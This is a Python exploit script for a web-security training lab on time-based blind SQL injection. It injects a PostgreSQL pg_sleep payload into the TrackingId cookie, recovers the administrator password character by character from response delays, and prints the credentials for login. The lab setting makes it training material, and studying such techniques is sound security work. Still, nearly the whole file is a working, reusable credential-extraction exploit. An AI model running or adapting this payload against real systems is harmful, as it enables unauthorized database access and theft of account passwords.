from colorama import Fore
import requests
import urllib3
import urllib.parse
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SQL injection with time delays and information retrieval"

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"

def sqli_password(url, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print("[+] Fetching initial session and tracking ID...")
    try:
        response = session.get(url)
        cookies = session.cookies.get_dict()
        tracking_id = cookies.get("TrackingId")
        session_id = cookies.get("session")
    except Exception as e:
        print(f"[!] Error fetching session: {e}")
        return False

    if not tracking_id or not session_id:
        print("[-] Failed to retrieve required cookies.")
        return False

    print(f"[+] TrackingId: {tracking_id}")
    print(f"[+] Session: {session_id}")
    print("[+] Extracting administrator password (lowercase + digits only):")

    extracted_password = ""
    for i in range(1, 21):
        for char in CHARSET:
            payload = (
                f"' || (SELECT CASE WHEN (username='administrator' AND "
                f"ascii(substring(password,{i},1))={ord(char)}) "
                f"THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--"
            )
            full_tracking_id = tracking_id + urllib.parse.quote(payload)

            cookies = {
                "TrackingId": full_tracking_id,
                "session": session_id
            }

            try:
                r = session.get(url, cookies=cookies)
            except Exception as e:
                print(f"[!] Request failed: {e}")
                return False

            if r.elapsed.total_seconds() > 9:
                extracted_password += char
                sys.stdout.write("\r" + extracted_password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write("\r" + extracted_password + char)
                sys.stdout.flush()

    print("\n[+] Extraction complete.")
    print(f"[+] Administrator password: {extracted_password}")
    print("[+] Login with above creds!")
    return True


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'TrackingId' cookie to determine the length of administrator's password based on time delays\n2. Modify the payload to brute force the administrator's password\n3. Fetch the login page\n4. Extract the csrf token and session cookie\n5. Login as the administrator\n6. Fetch the administrator profile\n""")

    return sqli_password(url, proxies)
